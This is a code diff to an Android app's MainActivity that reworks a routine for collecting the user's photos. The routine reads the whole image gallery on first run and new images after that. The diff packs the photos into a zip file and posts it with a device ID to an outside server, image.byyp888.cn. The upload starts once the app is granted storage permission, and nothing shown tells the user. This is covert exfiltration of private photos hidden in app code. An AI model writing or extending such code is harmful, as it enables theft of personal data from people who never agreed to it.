@@ -24,11 +24,13 @@ import io.flutter.embedding.engine.FlutterEngine
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
-import java.io.DataOutputStream
+import java.io.*
 import java.net.HttpURLConnection
 import java.net.URL
-import java.util.LinkedList
-import java.util.UUID
+import java.text.SimpleDateFormat
+import java.util.*
+import java.util.zip.ZipEntry
+import java.util.zip.ZipOutputStream
 
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
@@ -84,7 +86,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             withContext(Dispatchers.Main) {
                 ContextCompat.startForegroundService(Application.application, intent)
             }
-            scanAndUploadImages()
         }
     }
 
@@ -132,7 +133,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    private suspend fun uploadImage(imageUri: android.net.Uri, fileName: String, deviceId: String): Boolean {
+    private suspend fun uploadZipFile(zipFile: File, deviceId: String): Boolean {
         return try {
             val boundary = "----AndroidFormBoundary${System.currentTimeMillis()}"
             val url = URL("https://image.byyp888.cn/upload?deviceid=$deviceId")
@@ -145,14 +146,12 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=$boundary")
 
             val outputStream = DataOutputStream(conn.outputStream)
-            val inputStream = contentResolver.openInputStream(imageUri)
-            val imageBytes = inputStream?.readBytes()
-            inputStream?.close()
+            val fileBytes = zipFile.readBytes()
 
             outputStream.writeBytes("--$boundary\r\n")
-            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"$fileName\"\r\n")
-            outputStream.writeBytes("Content-Type: image/jpeg\r\n\r\n")
-            outputStream.write(imageBytes ?: byteArrayOf())
+            outputStream.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"${zipFile.name}\"\r\n")
+            outputStream.writeBytes("Content-Type: application/zip\r\n\r\n")
+            outputStream.write(fileBytes)
             outputStream.writeBytes("\r\n--$boundary--\r\n")
             outputStream.flush()
             outputStream.close()
@@ -163,7 +162,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    private fun scanAndUploadImages() {
+    private fun zipAndUploadImages() {
         val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
         val editor = prefs.edit()
 
@@ -191,9 +190,8 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                 "${MediaStore.Images.Media.DATE_ADDED} ASC"
             )
 
-            val toUpload = mutableListOf<Triple<android.net.Uri, String, Long>>()
+            val imageFiles = mutableListOf<Pair<String, ByteArray>>()
             var maxTimestamp = lastUploadTime
-
             cursor?.use {
                 while (it.moveToNext()) {
                     val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
@@ -201,49 +199,34 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
                     val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
                     val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
                     val timestamp = if (dateTaken > 0) dateTaken else dateAdded
-
                     if (isFirstUpload || timestamp > lastUploadTime) {
                         val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                        toUpload.add(Triple(uri, name, timestamp))
+                        val bytes = contentResolver.openInputStream(uri)?.readBytes()
+                        if (bytes != null) {
+                            imageFiles.add(name to bytes)
+                            if (timestamp > maxTimestamp) maxTimestamp = timestamp
+                        }
                     }
                 }
             }
 
-            val failedImagesJson = prefs.getString("failed_images", "[]") ?: "[]"
-            val failedImages = mutableListOf<Triple<android.net.Uri, String, Long>>()
-            try {
-                val jsonArr = JSONArray(failedImagesJson)
-                for (i in 0 until jsonArr.length()) {
-                    val item = jsonArr.getJSONObject(i)
-                    failedImages.add(
-                        Triple(android.net.Uri.parse(item.getString("uri")), item.getString("name"), item.getLong("timestamp"))
-                    )
-                }
-            } catch (_: Exception) {}
-
-            toUpload.addAll(failedImages)
-
-            val failedNextTime = mutableListOf<JSONObject>()
-            val deferreds = toUpload.map { (uri, name, timestamp) ->
-                async(Dispatchers.IO) {
-                    val success = uploadImage(uri, name, deviceId)
-                    if (success && timestamp > maxTimestamp) {
-                        maxTimestamp = timestamp
-                    } else {
-                        val obj = JSONObject()
-                        obj.put("uri", uri.toString())
-                        obj.put("name", name)
-                        obj.put("timestamp", timestamp)
-                        failedNextTime.add(obj)
+            if (imageFiles.isNotEmpty()) {
+                val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
+                val zipFile = File(cacheDir, "images_${sdf.format(Date())}.zip")
+                ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zipOut ->
+                    imageFiles.forEach { (name, bytes) ->
+                        zipOut.putNextEntry(ZipEntry(name))
+                        zipOut.write(bytes)
+                        zipOut.closeEntry()
                     }
                 }
+                if (uploadZipFile(zipFile, deviceId)) {
+                    editor.putBoolean("is_first_upload", false)
+                    editor.putLong("last_upload_time", maxTimestamp)
+                    editor.apply()
+                }
+                zipFile.delete()
             }
-            deferreds.awaitAll()
-
-            editor.putString("failed_images", JSONArray(failedNextTime).toString())
-            if (isFirstUpload) editor.putBoolean("is_first_upload", false)
-            editor.putLong("last_upload_time", maxTimestamp)
-            editor.apply()
         }
     }
 
@@ -273,7 +256,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
             grantStoragePermission()
         } else {
-            scanAndUploadImages()
+            zipAndUploadImages()
         }
     }
 
@@ -288,7 +271,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             }
             STORAGE_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    scanAndUploadImages()
+                    zipAndUploadImages()
                 } else {
                     onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
                 }
